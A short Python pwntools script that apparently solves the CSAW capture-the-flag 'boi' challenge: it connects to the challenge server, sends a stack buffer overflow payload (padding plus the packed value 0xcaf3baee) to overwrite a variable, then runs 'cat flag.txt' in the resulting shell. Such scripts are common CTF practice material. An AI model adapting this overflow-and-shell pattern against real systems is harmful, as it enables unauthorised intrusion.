#!/usr/bin/env python2

from pwn import *

# r = process('./boi')
r = remote('pwn.chal.csaw.io', 9000)

r.recvline_startswith('Are you a big boiiiii??')
r.send('a'*0x14 + p32(0xcaf3baee))
r.sendline('cat flag.txt')
r.interactive()
